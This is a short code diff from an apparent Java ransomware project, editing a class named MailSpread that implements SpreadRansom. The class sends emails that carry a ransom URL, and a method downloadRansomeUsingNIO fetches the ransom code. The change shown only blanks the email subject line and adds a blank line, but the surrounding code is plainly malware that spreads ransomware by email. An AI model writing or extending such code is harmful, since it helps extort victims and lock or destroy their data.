@@ -119,7 +119,7 @@ public class MailSpread implements SpreadRansom {
 			message.setFrom(new InternetAddress(from));
 
 			// header field
-			message.setSubject("This is the Subject Line!");
+			message.setSubject("");
 
 			// actual message
 			String ransomURL="";
@@ -143,6 +143,7 @@ public class MailSpread implements SpreadRansom {
 		} catch (MessagingException mex) {
 			mex.printStackTrace();
 		}
+
 	}
 
 	private static void downloadRansomeUsingNIO(String urlstr) throws IOException {
